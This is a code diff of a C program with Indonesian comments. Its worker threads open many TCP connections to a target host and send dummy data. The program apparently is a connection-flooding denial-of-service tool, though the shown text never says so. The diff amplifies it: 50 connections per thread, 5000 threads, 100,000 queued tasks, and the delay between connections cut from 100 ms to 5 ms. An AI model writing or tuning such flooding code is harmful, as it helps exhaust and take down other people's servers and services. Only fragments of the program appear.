@@ -12,9 +12,9 @@
 #include <signal.h>
 #include <errno.h>
 
-#define CONNECTIONS 1    // 1 koneksi per thread untuk urutan berkelanjutan
-#define THREAD_POOL_SIZE 1000  // Jumlah thread besar
-#define MAX_TASKS 10000        // Task queue limit
+#define CONNECTIONS_PER_THREAD 50     // Jumlah koneksi per thread
+#define THREAD_POOL_SIZE 5000          // Jumlah thread besar
+#define MAX_TASKS 100000               // Task queue limit
 
 typedef struct {
     char host[256];
@@ -65,9 +65,9 @@ int make_socket(char *host, char *port) {
 
 void *worker_thread(void *arg) {
     Task *task = (Task *)arg;
-    int sockets[CONNECTIONS];
+    int sockets[CONNECTIONS_PER_THREAD];
     signal(SIGPIPE, &broke);
-    for (int i = 0; i < CONNECTIONS; i++) {
+    for (int i = 0; i < CONNECTIONS_PER_THREAD; i++) {
         sockets[i] = make_socket(task->host, task->port);
         if (sockets[i] != -1) {
             write(sockets[i], "\0", 1);  // Kirim data dummy
@@ -76,7 +76,7 @@ void *worker_thread(void *arg) {
         } else {
             fprintf(stderr, "[%i: Connection Failed]\n", task->id);
         }
-        usleep(100000); // Delay 100ms untuk urutan cepat
+        usleep(5000); // Delay sangat kecil untuk mempercepat task
     }
     return NULL;
 }
